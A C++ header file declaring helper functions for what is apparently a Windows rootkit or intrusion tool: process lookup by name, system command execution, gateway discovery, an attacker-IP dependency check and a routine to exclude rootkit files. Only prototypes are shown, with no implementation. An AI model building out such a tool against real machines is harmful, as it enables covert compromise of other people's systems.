#pragma once
#include <iostream>
#include <Windows.h>
#include <random>
#include <Psapi.h>

typedef struct _REPLACEMENT {
	char* Replace;
	char WhereTo;
	int RepCount;
} REPLACEMENT, * PREPLACEMENT;

int CharpToWcharp(const char* ConvertString, WCHAR* ConvertedString);
int WcharpToCharp(char* ConvertString, const WCHAR* ConvertedString);
std::wstring GetCurrentPath();
int CountOccurrences(const char* SearchStr, char SearchLetter);
void GetServiceName(char* Path, char* Buffer);
void ReplaceValues(const char* BaseString, REPLACEMENT RepArr[], char* Output, int Size);
DWORD ExecuteSystem(const char* BaseCommand, REPLACEMENT RepArr[], int Size);
void GetRandomName(char* NameBuf, DWORD RandSize, const char* Extension);
int GetPidByName(const char* Name);
int CheckLetterInArr(char Chr, const char* Arr);
BOOL PerformCommand(const char* CommandArr[], const char* Replacements[], const char* Symbols, int CommandCount, int SymbolCount);
int VerifyDependencies(const char* AttackerIp);
BOOL IsValidIp(char* Address);
int FileOperation(char* FilePath, HANDLE* FileHandle, PVOID* FileData,
	ULONG64* FileDataSize, BOOL IsWrite, BOOL ShouldNullTerm);
char* ExtractGateways(char* IpConfigOutput);
char* GetGatewayList();
DWORD ExcludeRootkitFiles();